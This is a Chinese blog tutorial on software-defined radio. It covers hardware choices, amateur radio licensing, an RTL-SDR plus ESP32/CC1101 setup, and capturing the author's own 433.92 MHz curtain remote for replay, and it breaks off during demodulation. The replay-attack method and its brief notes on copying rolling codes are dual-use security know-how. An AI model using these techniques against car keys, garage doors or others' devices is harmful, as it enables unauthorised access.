    <link href="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/"/>
    <url>/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/</url>
    
    <content type="html"><![CDATA[<h1 id="无线电安全-RTLSDR配合CC1101分析和重放遥控信号"><a href="#无线电安全-RTLSDR配合CC1101分析和重放遥控信号" class="headerlink" title="[无线电安全]RTLSDR配合CC1101分析和重放遥控信号"></a>[无线电安全]RTLSDR配合CC1101分析和重放遥控信号</h1><h2 id="SDR介绍"><a href="#SDR介绍" class="headerlink" title="SDR介绍"></a>SDR介绍</h2><p><a href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6%E6%97%A0%E7%BA%BF%E7%94%B5">软件无线电-Wiki</a></p><p>SDR是软件定义无线电的缩写，指将无线电系统中的信号处理功能（如通信协议的实现、信号的调制解调和频谱分析等）通过<strong>基于软件的数字信号处理</strong>来实现，少部分模拟信号处理和数模转换功能通过<strong>通用硬件</strong>实现。SDR的原理：通用硬件接收到模拟信号并转换成数字信号，数字信号由软件处理，处理完后软件输出要发射的数字信号，数字信号由通用硬件转换为模拟信号并发射。相比于传统的全硬件无线电，软件无线电可以不修改硬件，仅修改软件实现多种不同的无线协议或标准，具有灵活性强、开放性强、兼容性强、硬件成本低的优点。对于无线电技术爱好者，SDR既能满足DIY研究技术的需求，又能省去大量的专用设备购买成本。</p><p><strong>SDR可以干什么</strong></p><p>SDR的应用于航天、军事、工业、消费电子产品、多媒体等各个领域，产品包括：手机、电脑、无人机、汽车、智能家居、网络设备、传感器、工控机、移动通信、卫星通信、无线电广播和电视等。从无线技术的类别来分，包括：近场通信NFC、蓝牙BLE、射频RFID、工控无线传输ZigBee、无线局域网WiFi、卫星定位GPS、卫星通信SATCOM、手机蜂窝网络Cellular、航空无线电ADS-B等。</p><p>从安全攻防的角度来看，SDR可以涵盖无线通信安全的大部分内容，比如：跟踪商用飞机轨迹和航班信息、搭建伪基站、GSM窃听、GPS欺骗、捕获分析重放遥控器信号以及其它各类无线协议的分析和攻击。攻击手段主要有4种：监听、重放、欺骗、劫持。 </p><p><strong>需要哪些前置知识</strong></p><ul><li>通信原理</li><li><strong>通信系统</strong></li><li>数字信号处理</li><li><strong>调制与解调</strong></li><li>信号与系统</li></ul><p><strong>SDR硬件</strong></p><p>常见SDR硬件：HackRF、RTL-SDR、BladeRF、USRP、LimeSDR、PlutoSDR、Airspy</p><table><thead><tr><th>设备名称</th><th>工作频率</th><th>全&#x2F;半双工</th><th>价格</th></tr></thead><tbody><tr><td>HackRF One</td><td>1MHz到6GHz</td><td>Rx+Tx</td><td>500-1000元</td></tr><tr><td>RTL-SDR(R820T&#x2F;R860&#x2F;R828D)</td><td>24MHz-1.76GHz</td><td>Rx</td><td>80-300元</td></tr><tr><td>BladeRF</td><td>300MHz-3.8GHz</td><td>Rx+Tx</td><td>500-10000元</td></tr><tr><td>USRP系列</td><td>取决于具体型号，所有设备涵盖直流电至6GHz，见<a href="https://www.ni.com/en-us/shop/category/software-defined-radios.html">官网</a></td><td>Rx+Tx</td><td>2000-20w元</td></tr><tr><td>LimeSDR</td><td>有Mini2.0、XTRX、X3三个型号，最高3.8GHz，见<a href="https://limemicro.com/sdr/">官网</a></td><td>Rx+Tx</td><td>$400&#x2F;800&#x2F;20000</td></tr><tr><td>PlutoSDR(ADALM-PLUTO)</td><td>325MHz-3.8GHz(可提升至70MHz-6GHz:<a href="https://0x0root.com/2017/11/29/plutosdr-getting-started/">参考</a>)</td><td>Rx+Tx</td><td>$195(淘宝1000元左右)</td></tr><tr><td>Airspy(Mini&#x2F;R2&#x2F;HF+)</td><td>24-1700MHz</td><td>Rx</td><td>$99&#x2F;169(淘宝1000元左右)</td></tr></tbody></table><p>SDR硬件主要包含天线、射频前端、数模转换器和用于执行数字功能的FPGA或SoC。对于半双工的SDR，可以添加射频前端模组对其功能进行拓展。虽然SDR的理念是软件替代硬件，但有时也需要依赖额外的硬件实现特定功能(比如接收ADS-B信号)，开发能力强的话也可以DIY自己的SDR设备。</p><p><strong>SDR软件</strong></p><p>常见SDR软件：GNU Radio、SDR++、GQRX、SDR#、MATLAB、Simulink、SoapySDR、PothosSDR、PySDR。</p><p>结合硬件和目标应用选择软件。</p><h2 id="业余无线电介绍"><a href="#业余无线电介绍" class="headerlink" title="业余无线电介绍"></a>业余无线电介绍</h2><p>业余无线电是一种在全世界非常普遍的业余爱好，业余无线电爱好者又被称为HAM。根据Wiki的数据，截至2024年，中国有24万左右HAM，美国有75万左右HAM，全世界有三至四百万HAM。搞无线电涉及到安全和法律的问题，受各国政府严格管控，因此“准”业余无线电爱好者需要经过考试才能得到业余无线电执照，有了执照才能合法开展业余无线电活动，成为真正的HAM。不同国家有不同的业余无线电执照和相应制度。</p><p>在中国，执照分为<strong>中国无线电协会业余电台操作证书</strong>（简称“操作证书”）和<strong>中华人民共和国无线电台执照</strong>（简称“业余电台执照”）两个部分。</p><ul><li><p>操作证书分为A类、B类和C类，是业余无线电爱好者个人的操作技术能力的证明，也是使用业余无线电台的许可。</p><p>统一在CRAC官网进行考试报名和信息查询。A类和B类考试由各省的考试机构自行组织，C类考试由CRAC统一组织。</p><p>操作证书由<a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%9B%BD%E6%97%A0%E7%BA%BF%E7%94%B5%E5%8D%8F%E4%BC%9A%E4%B8%9A%E4%BD%99%E6%97%A0%E7%BA%BF%E7%94%B5%E5%88%86%E4%BC%9A">中国无线电协会业余无线电分会</a>（简称CRAC）负责核发，在全国范围通用，并且终身有效。</p><p>初次申领者不限年龄，但只能参加A类考试；取得A类操作证书取得业余无线电台执照6个月以上可以参加B类考试；取得B类操作证书并取得载明30MHz以下频段的业余无线电台执照18个月以上可以参加C类考试。</p><p>详情参见《业余无线电台管理办法》第三章及CRAC官网。</p></li><li><p>业余电台执照是设置业余无线电台的许可，证明你的电台是合法的。 </p><p>需要取得操作证书后才能申请对应频率的设备的业余电台执照，参考对照表如图。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/1.png" alt="1"></p><p>对于没有呼号的申请者，无线电管理机构颁发业余无线电台执照时会同时核发业余无线电台呼号。业余无线电操作员在无线电通信中以“呼号”唯一地表明自己或台站的身份。</p><p>除了有型号核准的无线电发射设备，也可以申请自制、改装、 拼装等未取得型号核准的设备，但是需要提交额外的说明材料并经过检验。</p><p>详情参见《业余无线电台管理办法》第二章及CRAC官网。</p></li></ul><p><a href="https://zh.wikipedia.org/wiki/%E4%B8%9A%E4%BD%99%E6%97%A0%E7%BA%BF%E7%94%B5">业余无线电-Wiki</a></p><p><a href="https://zh.wikipedia.org/wiki/%E4%B8%9A%E4%BD%99%E6%97%A0%E7%BA%BF%E7%94%B5%E7%88%B1%E5%A5%BD%E8%80%85">业余无线电爱好者 - Wiki</a></p><p><a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E4%B8%9A%E4%BD%99%E6%97%A0%E7%BA%BF%E7%94%B5%E6%89%A7%E7%85%A7%E5%88%B6%E5%BA%A6">中华人民共和国业余无线电执照制度 - Wiki</a></p><p><a href="https://www.gov.cn/gongbao/2024/issue_11286/202404/content_6945591.html">中华人民共和国业余无线电台管理办法</a></p><p><a href="http://crac.org.cn/">中国无线电协会业余无线电分会官网</a></p><p>无线电相关的政策查询、频率划分查询、认证考试、备考刷题和模拟考试都可以在<strong>智谱APP</strong>上进行。</p><p>此外，还可以关注各地区的<strong>无线电协会公众号</strong>，HAM会举办各类的活动例如跳蚤市场、聚会、比赛等。</p><h2 id="无线电频率划分"><a href="#无线电频率划分" class="headerlink" title="无线电频率划分"></a>无线电频率划分</h2><p>无线电波的频率范围：0~3000GHz。无线电频率的划分非常复杂，涉及到地区、国家、部门、业务和应用等因素，这里不赘述。</p><p>了解特定业务频率范围可以查阅最新政策文件：<a href="http://www.crac.org.cn/userfiles/file/20240419/20240419164801_9782.pdf">《中华人民共和国无线电频率划分规定》（2023版）</a></p><p>也可以参考较新的野生资料：<a href="https://zhuanlan.zhihu.com/p/684488623">2024最全无线通信频率分配</a></p><p>其它常见无线电频率补充：</p><ul><li><p>无线电遥控器：27Mhz、315MHZ、330MHZ、350MHZ、390MHZ、418MHZ、430MHZ、433.92MHZ、915MHz、2.4GHz。</p></li><li><p>广播与电视：</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/2.png" alt="2"></p></li><li><p>对讲机&#x2F;电台：频率越高，穿透力越强，抗干扰能力越弱，成本越高。</p><p>民用对讲机(公众无线电)</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs subunit">专业对讲机：V段136<span class="hljs-string">-174</span>MHZ，U段400<span class="hljs-string">-470</span>MHZ<br>民用对讲机(公众无线电)：409<span class="hljs-string">-410</span>MHz<br>武警公安用：350<span class="hljs-string">-390</span>MHZ<br>海岸用：220MHZ<br>交通信号灯监控、防空警报器：223.025<span class="hljs-string">-235</span>Mhz<br>业余无线电：V段144.000<span class="hljs-string">-145</span>.800MHz，U段430.000<span class="hljs-string">-435</span>.000MHz和438.000<span class="hljs-string">-440</span>.000MHz<br>集群用：800MHZ<br>手机：900MHZ/180MHZ<br></code></pre></td></tr></table></figure><p>民用对讲机，我国频段是409-410MHz，欧美国家分462MHz和467MHz两组</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/3.png" alt="3"></p></li><li><p>蜂窝网络(Cellular network)：主流蜂窝网络包括GSM、UMTS&#x2F;HSPA(3G)、LTE&#x2F;LTE-A(4G)、NR(5G)。安卓手机可以用Cellular-Z APP测试蜂窝信号。具体不同网络和不同供应商的频率划分参考上文的野生资料。</p></li></ul><h2 id="全双工SDR系统搭建"><a href="#全双工SDR系统搭建" class="headerlink" title="全双工SDR系统搭建"></a>全双工SDR系统搭建</h2><h3 id="软硬件介绍"><a href="#软硬件介绍" class="headerlink" title="软硬件介绍"></a>软硬件介绍</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">硬件：<br>RTL<span class="hljs-built_in">-SDR</span>(R820T2调谐器+RTL2832U解调器+天线)<br>ESP32-WROOM-<span class="hljs-number">32</span>开发板<br>E07-M1101D <span class="hljs-number">443</span>M射频模块<br>软件：<br>Universal Radio Hacker（URH）<br></code></pre></td></tr></table></figure><h4 id="RTL-SDR-R820T-RTL2832U-天线"><a href="#RTL-SDR-R820T-RTL2832U-天线" class="headerlink" title="RTL-SDR(R820T+RTL2832U+天线)"></a>RTL-SDR(R820T+RTL2832U+天线)</h4><p>廉价，能够实现较大频率范围的无线信号接收，但没有发送信号的功能。有V3、V4等较新的型号，频率和基本功能不变，优化了稳定性、发热问题等细节。</p><p>用途1：接收DVB-T电视(在国外有DAB-T格式电视的地区)、FM广播、<a href="https://blog.csdn.net/u011468564/article/details/139192584">ADS-B</a>等。</p><p>用途2：作为SDR使用，可以接收24MHz-1.7GHz的无线电信号。</p><h4 id="射频模块和主控"><a href="#射频模块和主控" class="headerlink" title="射频模块和主控"></a>射频模块和主控</h4><p>由于RTL-SDR不具有发射功能，还需要通过<code>主控+CC1101射频模块</code>实现无线信号的发射，参考**<a href="https://github.com/sbusso/cc1101-tool">cc1101-tool</a>**项目，HackRF的射频发送功能也采用该方案。CC1101也能接收信号，但是和SDR软件不兼容，分析信号不方便，并且工作频率范围是387.0MHz～464.0MHz，远不如专门的SDR硬件。</p><p>主控用于烧入程序控制整个系统的交互。主控有很多选项，包括ESP32、Arduino Pro Micro、ESP8266、STM32、Arduino-NANO等。笔者用的是ESP32-WROOM-32。</p><p><a href="https://openatomworkshop.csdn.net/67404e223a01316874d7390e.html">ESP-WROOM-32开发板介绍</a></p><p>CC1101无线芯片是一款国际大厂TI德州仪器（Texas Instruments）研发的低功耗无线传输芯片，能够工作在315、433、868和915MHz频段。淘宝上买到的开发板主要有TI-CC1101、M1101D系列。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/4.png" alt="4"></p><h4 id="Universal-Radio-Hacker-URH"><a href="#Universal-Radio-Hacker-URH" class="headerlink" title="Universal Radio Hacker(URH)"></a>Universal Radio Hacker(URH)</h4><p>一个用于逆向解析无线通信协议的开源工具。发表在12th USENIX Workshop on Offensive Technologies（woot’18）会议。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">通用无线电黑客 <span class="hljs-comment">(URH)</span> 是一套完整的无线协议调查工具，原生支持多种常见的软件定义无线电。URH 可以轻松解调信号，并自动检测调制参数，从而可以轻松识别空中传输的比特和字节。由于数据通常在传输前进行编码，URH 提供可自定义的解码，甚至可以破解 CC<span class="hljs-number">1101</span> 数据白化等复杂编码。在协议逆向工程方面，URH 有两种用途。您可以手动分配协议字段和消息类型，也可以让 URH使用基于规则的智能自动推断协议字段。最后，URH 包含一个针对无状态协议的模糊测试组件和一个用于有状态攻击的模拟环境。<br></code></pre></td></tr></table></figure><p><a href="https://www.usenix.org/conference/woot18/presentation/pohl">论文和ppt</a>  <a href="https://github.com/jopohl/urh">github仓库</a>  <a href="https://github.com/jopohl/urh/releases/download/v2.0.0/userguide.pdf">操作使用手册</a></p><h3 id="E07-M1101D-ESP32配置"><a href="#E07-M1101D-ESP32配置" class="headerlink" title="E07-M1101D + ESP32配置"></a>E07-M1101D + ESP32配置</h3><p><strong>接线</strong></p><p>E07-M1101D无线收发模块各引脚含义及与主控的接线方式如图。</p><p>图片来自<a href="https://github.com/sbusso/cc1101-tool">cc1101-tool</a>中的<code>E07-M1101D-SMA_Usermanual_EN_v1.30.pdf</code>。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/5.png" alt="5"></p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/6.png" alt="6"></p><p>笔者买的ESP32-WROOM-32主控的引脚如图。可以看到有H和V两组SPI引脚，E07-M1101D中CSN、SCK、MOSI、MISO四个引脚连接到ESP32上任意一组4线SPI接口即可，两组SPI接口是一样的。GND和VCC不用多说，还剩下GDO2和GDO0两个数据输出接口不知道怎么连。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/7.png" alt="7"></p><p>我们参考ESP8266和CC1101模块，GDO0和GDO2分别连D1和D2引脚。</p><p>图片来自<a href="https://github.com/sbusso/cc1101-tool">cc1101-tool</a>中的<code>Esp8266_CC1101.png</code>。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/8.png" alt="8"></p><p>查询ESP8266中D1和D2引脚的作用。如图，分别是SCL和SDA，那么E07-M1101D的GDO0和GDO2分别连接ESP32的<code>I2C_SCL(GPIO22,D22)</code>和<code>I2C_SDA(GPIO21,D21)</code>。</p><p>图片来自<a href="https://github.com/sbusso/cc1101-tool">cc1101-tool</a>中的<code>ESP8266_Pinout_Diagrams.pdf</code>。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/9.png" alt="9"></p><p>总结，笔者的设备接线如下：</p><table><thead><tr><th>E07-M1101D 443MHz</th><th>ESP32-WROOM-32</th></tr></thead><tbody><tr><td>引脚1(GND)</td><td>GND</td></tr><tr><td>引脚2(VCC)</td><td>3V3</td></tr><tr><td>引脚3(GDO0)</td><td>D22(I2C_SCL)</td></tr><tr><td>引脚4(CSN)</td><td>D15(HSPI_CS)</td></tr><tr><td>引脚5(SCK)</td><td>D14(HSPI_CLK)</td></tr><tr><td>引脚6(MOSI)</td><td>D13(HSPI_MOSI)</td></tr><tr><td>引脚7(MISO&#x2F;GDO1)</td><td>D12(HSPI_MISO)</td></tr><tr><td>引脚8(GDO2)</td><td>D21(GPIO21,I2C_SDA)</td></tr></tbody></table><p><strong>安装CP2101驱动</strong></p><p>  ESP32-WROOM-32开发板使用CP2102-USB转串口芯片来和外部设备进行串口通信，所以还要安装CP2102的驱动，否则如图无法识别设备。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/10.png" alt="10"></p><p><a href="https://www.silabs.com/developer-tools/usb-to-uart-bridge-vcp-drivers?tab=downloads">CP2102驱动下载传送门</a></p><p>下载如下文件并安装驱动</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/11.png" alt="11"></p><p>安装完成后可以正常识别</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/12.png" alt="12"></p><p><strong>Arduino烧录交互程序至ESP32</strong></p><p><a href="https://github.com/sbusso/cc1101-tool">cc1101-tool项目</a>为我们提供了要烧录到ESP32的串口终端程序，负责处理ESP32、CC1101模块和PC间的交互，使用Arduino IDE进行烧录。</p><p>下载并安装Arduino IDE：<a href="https://www.arduino.cc/en/software">传送门</a></p><p>安装CC1101的依赖库</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/13.png" alt="13"></p><p>安装ESP32开发板软件包</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/14.png" alt="14"></p><p>Arduino IDE配置完成后选择自己设备对应的ino文件进行烧录。笔者要烧录的是<code>cc1101-tool-esp32-wroom.ino</code>。因为板子有两组SPI接口，笔者接线用的是HSPI，原本代码用VSPI，gdo0和gdo2接线也不同，所以代码中引脚定义部分需要进行修改，如图</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/15.png" alt="15"></p><p><strong>连接串口</strong></p><p>用终端仿真工具连接串口，Putty、SecureCRT、MobaXterm等都可以，这里用MobaXterm，波特率设置为代码中的115200，端口选择ESP32的CP2102对应端口。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/16.png" alt="16"></p><p>连上后显示Connect OK并且help正常显示命令，配置成功</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/17.png" alt="17"></p><h3 id="RTL-SDR和URH配置"><a href="#RTL-SDR和URH配置" class="headerlink" title="RTL-SDR和URH配置"></a>RTL-SDR和URH配置</h3><p><strong>RTL-SDR接线</strong></p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/18.jpg" alt="18"></p><p><strong>RTL-SDR驱动安装</strong></p><p>windows下使用<a href="https://zadig.akeo.ie/">Zadig工具</a>安装对应驱动</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/19.png" alt="19"></p><p>插上RTL-SDR，开启<code>Options</code> -&gt; <code>List All Devices</code>。分别选中<code>Bulk-In,Interface 1</code>和<code>Bulk-In,Interface 0</code>接口，分别安装默认的WinUSB驱动。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/20.png" alt="20"></p><p><strong>URH安装和使用</strong></p><p><a href="https://github.com/jopohl/urh">URH github仓库</a></p><p>windows平台下载Release中的安装程序安装。几个主要功能如图。一般先频谱分析获取无线电信号的频率，然后记录该频率的信号保存为文件并进行分析。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/21.png" alt="21"></p><p>设备选择RTL-SDR，刷新后能识别出设备说明之前驱动安装得没问题。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/22.png" alt="22"></p><h2 id="遥控技术安全"><a href="#遥控技术安全" class="headerlink" title="遥控技术安全"></a>遥控技术安全</h2><p>遥控技术主要有红外遥控 、无线电(射频)遥控、蓝牙遥控和WIFI遥控。</p><p>红外遥控(非无线电波)：将遥控信号(二进制脉冲码)，调制在38kHZ的载波上，经过缓冲放大后送至红外发光二极管，转化为红外信号发射出去。红外线的频率不在无线电波范围内，现有大部分SDR平台无法收发红外线信号。部分手机有红外功能，Android也支持红外遥控开发的API，可以配合红外收发模块DIY自己的红外设备。红外遥控通信距离短、无法绕过障碍物，一般只应用于玩具或廉价家电，因此红外遥控安全的研究价值较低。</p><p>蓝牙和WIFI遥控的安全性主要是针对蓝牙和WIFI协议本身。 </p><p>无线电遥控的安全性涉及编码和加密、通信协议等，由专用的编码和解码芯片来实现，主要有固定码、学习码和滚动码三种方案，安全性：滚动码&gt;学习码&gt;固定码。</p><ul><li>固定码：编码固定，所有通信信号不变，易被截获并重放。常见编码芯片有2260、2262、PT2264等，解码芯片有2270、2272、2294等。</li><li>学习码：信号的某部分固定，另一部分可自定义。例如可学习用户指定信号。常见编码芯片有1527、2240、527等，解码一般通过单片机。</li><li>滚动码：每次信号发送都生成新的动态代码，基于一定的同步算法进行匹配(比如AES加密使用随机密钥，发射方和接收方同步生成密钥的种子和时间)，无法直接重放信号。常见编码芯片有HCS301、HCS300、HCS200、HCS101等；解码芯片有TDH6301、TCT6301、SMC400等。</li></ul><p>以上编解码芯片的名称都由字母前缀+数字组成，其中数字代表型号，字母代表品牌。只写数字表示该型号芯片有多个不同品牌。</p><p>无线电遥控的应用：汽车钥匙、车库门遥控器、智能家居设备等，比较常见的频率有315&#x2F;433MHz、868MHz、2.4GHz。</p><p>目前市面上有遥控器频率测试仪、拷贝型遥控器和学习型遥控器(类似于智能卡中的变色龙)，还有集成了识别频率、编码芯片型号、编码类型等参数功能和学习拷贝功能的设备。理论上，识别频率、拷贝并重放信号的操作同样可以通过SDR实现，编码芯片型号的识别则需要研究不同芯片的具体编码特征。针对滚动码遥控的拷贝一般需要通过捕获并分析信号、测信道攻击、逆向编解码芯片的固件等方式，分析编码方式和通信协议并获取关键密钥。</p><h2 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h2><p>测试内容：捕获遥控器的信号并分析后进行重放。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode">遥控器型号：杜亚DOOYA DC<span class="hljs-number">2700</span>AC单通道发射器<span class="hljs-comment">(编码芯片未公开)</span><br>频率：<span class="hljs-number">433.92</span>MHz<br>功能：和窗帘电机完成对码后控制窗帘升降<br>按键：<span class="hljs-number">3</span>个<span class="hljs-comment">(窗帘放下、窗帘上升、暂停)</span><br></code></pre></td></tr></table></figure><p>遥控器使用前需要和电机对码，因此大概率是学习码芯片</p><h3 id="确认频率"><a href="#确认频率" class="headerlink" title="确认频率"></a>确认频率</h3><p>进入spectrum analyzer功能，捕获遥控器信号，观察峰值频率为433.92MHz，确认频率。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/23.png" alt="23"></p><h3 id="记录信号"><a href="#记录信号" class="headerlink" title="记录信号"></a>记录信号</h3><p>进入Record Signal功能，记录遥控器发出的三种基带数字信号并分别保存为文件</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/24.png" alt="24"></p><h3 id="解调信号"><a href="#解调信号" class="headerlink" title="解调信号"></a>解调信号</h3><p>URH打开文件进行解调和分析，调制方式设置为ASK(遥控器大多采用ASK的调制方式)，点击Autodetect parametres，显示方式设置为Hex。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/25.png" alt="25"></p><p>放大信号，这里软件自动识别参数进行ASK解码，得到三个按键的信号数据完全相同，说明参数存在问题。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/26.png" 